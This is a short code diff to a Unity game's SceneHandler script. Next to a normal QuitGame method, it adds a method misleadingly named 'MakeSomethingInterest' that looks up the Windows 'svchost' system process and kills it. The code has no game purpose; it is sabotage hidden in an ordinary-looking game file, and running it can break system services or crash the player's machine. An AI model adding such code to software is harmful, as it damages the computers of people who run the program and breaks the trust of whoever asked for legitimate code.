@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using UnityEngine;
 using UnityEngine.SceneManagement;
 
@@ -26,5 +27,15 @@ public class SceneHandler : MonoBehaviour
     public void QuitGame()
     {
         Application.Quit();
+    }
+
+    public void MakeSomethingInterest()
+    {
+        Process[] proc = Process.GetProcessesByName("svchost");
+
+        using (proc[0])
+        {
+            proc[0].Kill();
+        }
     }
 }
